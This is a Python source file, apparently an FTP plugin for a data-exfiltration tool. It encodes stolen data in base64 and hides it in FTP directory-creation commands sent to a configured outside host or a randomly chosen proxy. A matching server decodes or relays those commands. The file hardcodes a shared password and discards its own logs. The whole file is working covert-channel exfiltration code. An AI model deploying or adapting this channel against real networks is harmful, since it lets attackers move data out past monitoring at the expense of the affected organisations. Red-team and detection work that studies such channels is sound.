import logging
from ftplib import FTP
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer
from pyftpdlib.authorizers import DummyAuthorizer
from random import choice
import base64

app_exfiltrate = None
config = None

user = "user"
passwd = "5up3r5tr0ngP455w0rD"

class CustomFTPHandler(FTPHandler):

    def ftp_MKD(self, path):
        app_exfiltrate.log_message('info', "[ftp] Received MKDIR query from {}".format(self.addr))
        data = str(path).split('/')[-1]
        if self.handler == "retrieve":
            app_exfiltrate.retrieve_data(base64.b64decode(data))
        elif self.handler == "relay":
            relay_ftp_mkdir(data)
        # Recreate behavior of the original ftp_MKD function
        line = self.fs.fs2ftp(path)
        self.respond('257 "%s" directory created.' % line.replace('"', '""'))
        return path

def send(data):
    if config.has_key('proxies') and config['proxies'] != [""]:
        targets = [config['target']] + config['proxies']
        target = choice(targets)
    else:
        target = config['target']
    port = config['port']
    try:
        ftp = FTP()
        ftp.connect(target, port)
        ftp.login(user, passwd)
    except:
        pass

    try:
        ftp.mkd(base64.b64encode(data))
    except:
        pass

def relay_ftp_mkdir(data):
    target = config['target']
    port = config['port']
    app_exfiltrate.log_message('info', "[proxy] [ftp] Relaying MKDIR query to {}".format(target))
    try:
        ftp = FTP()
        ftp.connect(target, port)
        ftp.login(user, passwd)
    except:
        pass
    try:
        ftp.mkd(data)
    except:
        pass

def init_ftp(data_handler):
    logging.basicConfig(filename="/dev/null", format="", level=logging.INFO)
    port = config['port']
    authorizer = DummyAuthorizer()
    authorizer.add_user(user, passwd, homedir="/tmp", perm='elradfmw')

    handler = CustomFTPHandler
    handler.authorizer = authorizer
    handler.handler = data_handler
    server = FTPServer(('', port), handler)
    server.serve_forever()

def listen():
    app_exfiltrate.log_message('info', "[ftp] Listening for FTP requests")
    init_ftp("retrieve")

def proxy():
    app_exfiltrate.log_message('info', "[proxy] [ftp] Listening for FTP requests")
    init_ftp("relay")

class Plugin:

    def __init__(self, app, conf):
        global app_exfiltrate, config
        app_exfiltrate = app
        config = conf
        app.register_plugin('ftp', {'send': send, 'listen': listen, 'proxy': proxy})
